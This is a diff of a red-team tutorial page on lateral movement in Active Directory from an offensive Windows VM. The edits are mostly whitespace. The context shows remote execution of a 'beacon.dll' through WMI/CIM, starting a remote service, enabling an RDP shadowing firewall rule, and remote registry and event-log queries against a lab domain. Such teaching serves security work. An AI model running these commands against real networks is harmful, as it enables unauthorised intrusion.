@@ -69,7 +69,7 @@ The first category of attacks that are possible are the ones that focus on Activ
 | Active Directory Web Services         | ADWS             | 9389/TCP |                                                                                         |
 
 ### ActiveDirectory PowerShell module
-A very powerful toolset that is included in Windows are the Remote Server Administration Tools (RSAT), which has been installed in the Offensive Windows VM in the [Offensive setup: Offensive Windows VM](/living-off-the-foreign-land-windows-as-offensive-platform-part-2#offensive-setup-offensive-windows-vm) section. RSAT consists of Microsoft Management Console (MMC) snap-ins, command-line tools as well various PowerShell modules for remote management. One of those modules is the `ActiveDirectory` module which contains close to 150 cmdlets which can be listed using `Get-Command -Module ActiveDirectory`.
+A very powerful toolset that is included in Windows are the Remote Server Administration Tools (RSAT), which has been installed in the Offensive Windows VM in the [Offensive setup: Offensive Windows VM](/living-off-the-foreign-land-windows-as-offensive-platform-part-2#offensive-setup-offensive-windows-vm) section in part 2. RSAT consists of Microsoft Management Console (MMC) snap-ins, command-line tools as well various PowerShell modules for remote management. One of those modules is the `ActiveDirectory` module which contains close to 150 cmdlets which can be listed using `Get-Command -Module ActiveDirectory`.
 
 Because the Offensive Windows VM is not officially part of the domain, depending on the cmdlet used it might be required to use the `-Server` parameter which is supported by most of the cmdlets in the `ActiveDirectory` module to force the cmdlet to interact with the domain controller in the target network. As discussed in an earlier section, all (Kerberos) authentication is transparently taken care of by the respective authentication package. To avoid to have to specify the `-Server` parameter each time, it is possible to configure that for certain cmdlets (any cmdlet where the noun starts with AD) the `-Server` parameter is automatically added with the specified value. The following line of PowerShell can be used for that.
 
@@ -140,12 +140,12 @@ Another way to display running processes is using WMI where the instances of the
 
 ```powershell
 PS C:\> Get-CimInstance Win32_Process -Filter 'Name="WINWORD.exe"' -ComputerName W10.ad.bitsadmin.com | fl ProcessId,Name,CommandLine
- 
+
 ProcessId   : 6204
 Name        : WINWORD.EXE
 CommandLine : "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n
               "C:\Users\User1\Documents\Passwords.docx" /o ""
- 
+
 PS C:\>
 ```
 
@@ -199,12 +199,12 @@ The same WMI execution can be accomplished using `Invoke-CimMethod` which in con
 PS C:\> $so = New-CimSessionOption -Protocol Dcom
 PS C:\> $s = New-CimSession -ComputerName W10.ad.bitsadmin.com -SessionOption $so
 PS C:\> Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine='C:\Windows\System32\rundll32.exe "C:\tmp\App Folder\beacon.dll",Start'} -CimSession $s
- 
+
 ProcessId ReturnValue PSComputerName
 --------- ----------- --------------
      3648           0 W10.ad.bitsadmin.com
- 
- 
+
+
 PS C:\>
 ```
 
@@ -239,7 +239,7 @@ Optionally, this service can be started right away.
 
 ```powershell
 PS C:\> sc.exe \\W10.ad.bitsadmin.com start Spooler64
- 
+
 SERVICE_NAME: Spooler64
         TYPE               : 10  WIN32_OWN_PROCESS
         STATE              : 2  START_PENDING
@@ -250,7 +250,7 @@ SERVICE_NAME: Spooler64
         WAIT_HINT          : 0x7d0
         PID                : 1076
         FLAGS              :
- 
+
 PS C:\>
 ```
 
@@ -278,10 +278,10 @@ The Windows firewall can be queried or manipulated through the command-line usin
 
 ```powershell
 PS C:\> netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall set rule name="Remote Desktop - Shadow (TCP-In)" new enable=yes
- 
+
 Updated 1 rule(s).
 Ok.
- 
+
 PS C:\>
 ```
 
@@ -300,12 +300,12 @@ The registry of a remote system can both be queried and modified remotely, where
 
 ```powershell
 PS C:\> reg.exe query "\\W10.ad.bitsadmin.com\HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
- 
+
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
     SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
     BgInfo    REG_SZ    C:\Windows\BgInfo.exe C:\Windows\BgInfo.bgi /Timer:0 /nolicprompt
     KeePass 2 PreLoad    REG_SZ    "C:\Program Files\KeePass Password Safe 2\KeePass.exe" --preload
- 
+
 PS C:\>
 ```
 
@@ -326,7 +326,7 @@ The Windows Event log can be queried through the `Get-WinEvent` using the `-Comp
 
 ```powershell
 PS C:\> Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -FilterHashtable @{logname="Security";id=4768} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; TargetUserName=$_.Properties[0].Value; TargetDomainName=$_.Properties[1].Value; TargetSid=$_.Properties[2].Value; ServiceName=$_.Properties[3].Value; ServiceSid=$_.Properties[4].Value; TicketOptions=$_.Properties[5].Value; Status=$_.Properties[6].Value; TicketEncryptionType=$_.Properties[7].Value; PreAuthType=$_.Properties[8].Value; IpAddress=$_.Properties[9].Value; IpPort=$_.Properties[10].Value; CertIssuerName=$_.Properties[11].Value; CertSerialNumber=$_.Properties[12].Value; CertThumbprint=$_.Properties[13].Value} } | select -First 1
- 
+
 TimeCreated          : 11-07-2023 09:22:41
 TargetUserName       : User1
 TargetDomainName     : AD.BITSADMIN.COM
